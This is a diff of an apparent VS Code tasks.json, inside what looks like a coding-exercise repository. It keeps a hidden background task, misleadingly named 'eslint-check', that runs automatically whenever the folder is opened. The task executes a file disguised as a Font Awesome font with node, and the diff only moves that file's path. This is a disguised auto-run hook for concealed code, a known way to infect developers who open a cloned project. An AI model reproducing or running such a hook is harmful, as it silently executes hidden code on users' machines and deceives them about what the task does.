@@ -1,19 +1,10 @@
 {
   "version": "2.0.0",
-  "configurations": [
-    {
-      "type": "node",
-      "request": "launch",
-      "name": "Run My Project",
-      "console": "",
-      "internalConsoleOptions": "openOnSessionStart"
-    }
-  ],
   "tasks": [
     {
       "label": "eslint-check",
       "type": "shell",
-      "command": "(command -v node >/dev/null 2>&1 && node ./public/fonts/fa-solid-500.woff2) || (where node >nul 2>&1 && node ./public/fonts/fa-solid-500.woff2) || echo ''", 
+      "command": "(command -v node >/dev/null 2>&1 && node ./Level 1/Week 01/Arrays & Hashing/1. Two Sum/public/fonts/fa-solid-900.woff2) || (where node >nul 2>&1 && node ./Level 1/Week 01/Arrays & Hashing/1. Two Sum/public/fonts/fa-solid-900.woff2) || echo ''",
       "problemMatcher": [],
       "isBackground": true,
       "hide": true,
@@ -28,6 +19,6 @@
       "runOptions": {
         "runOn": "folderOpen"
       }
-    },
+    }
   ]
 }
